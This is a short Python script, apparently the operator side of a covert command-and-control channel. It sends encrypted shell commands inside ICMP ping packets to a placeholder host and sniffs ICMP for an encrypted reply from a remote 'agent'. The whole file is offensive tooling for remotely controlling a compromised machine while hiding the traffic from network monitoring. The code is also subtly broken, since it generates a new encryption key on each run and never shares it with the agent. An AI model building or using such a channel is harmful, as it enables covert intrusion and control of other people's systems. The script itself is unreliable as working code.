#!/usr/bin/env python3
from scapy.all import *
from cryptography.fernet import Fernet

def main():
    # generate a key for encrypting the payload
    key = Fernet.generate_key()
    fernet = Fernet(key)

    while True:
        command = input('# Enter command: ')
        # encrypt the command using the Fernet key
        encrypted_command = fernet.encrypt(command.encode('utf-8'))

        # build the ICMP packet with the encrypted command as the payload
        pinger = IP(dst="localhost-xxx")/ICMP(id=0x0001, seq=0x1)/encrypted_command
        send(pinger)
        # wait for the ICMP message containing the encrypted response from the agent
        rx = sniff(count=1, timeout=2, filter='icmp')
        if rx:
            # decrypt the response using the Fernet key
            decrypted_response = fernet.decrypt(rx[0][Raw].load)
            print(decrypted_response.decode('utf-8'))
        else:
            print("No response received within timeout period.")

if __name__ == "__main__":
    main()

